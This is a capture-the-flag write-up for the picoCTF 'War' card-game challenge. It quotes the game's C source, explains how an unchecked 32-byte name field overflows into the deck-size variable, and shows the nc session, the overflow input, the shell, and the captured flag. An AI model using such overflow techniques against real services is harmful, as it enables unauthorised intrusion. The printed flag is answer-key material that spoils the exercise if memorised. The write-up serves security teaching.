<H1>War</H1>
<B>Win a simple Card Game. Source. Connect on shell2017.picoctf.com:4415.</B>

>Hints:
>
>Bugs typically happen in groups. If you find one, what does it allow you to do?

Connecting to the address and port presents us with a card game. Simple enough, make a bet if you win, increase your winnings, if you lose, lose the amount of your bet.

However, playing the game is another matter. After a couple of tries it appears the game is rigged against us: we always run out of cards before the opponent (assuming we haven't run out of money first).

So lets see if we can learn something from the source code. 

```c
...

#define NAMEBUFFLEN 32						            // (1)
#define BETBUFFLEN 8

...

typedef struct _gameState{
  int playerMoney;
  player ctfer;
  char name[NAMEBUFFLEN]; 					            // (2)
  size_t deckSize;							            // (3)
  player opponent;
} gameState;

gameState gameData;

...

int main(int argc, char**argv){
    char betStr[BETBUFFLEN];
    card * oppCard;
    card * playCard;
    memset(&gameData, 0, sizeof(gameData));
    gameData.playerMoney = 100;
    int bet;

    buildDecks(&gameData.ctfer, &gameData.opponent);   // (4)
    srand(time(NULL));//Not intended to be cryptographically strong

    ...
    
    memset(gameData.name,0,NAMEBUFFLEN);               // (5)
    if(!readInput(gameData.name,NAMEBUFFLEN)){
        printf("Read error. Exiting.\n");
        exit(-1);
    }
```
    
So it turns out this program does no input checking at all, this includes boundary checks as well. We know that:
 
 - (1), (2) - - - our name can be a maximum of 32 characters
 - (3) - - - the deck size variable follows right after the name variable
 - (4), (5) - - - that our card deck is created before setting our name

With this information we can overflow the name buffer and manipulate our deck to give us better odds at defeating our opponent. Lets go with 32 * 'a'. 

```bash
nc shell2017.picoctf.com 4415
Welcome to the WAR card game simulator. Work in progress...
Cards don't exchange hands after each round, but you should be able to win without that,right?
Please enter your name: 
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```
From here we just keep betting 1 until we start winning (if we reach 0, we just need to try again to get a better memory address to manipulate).

Eventually when we win, we will be given a shell. There we will find a flag.txt file.

```bash
cat flag.txt
```

We have our flag:

```
45912e79bbc247b344f6d0248fa3dc7f
```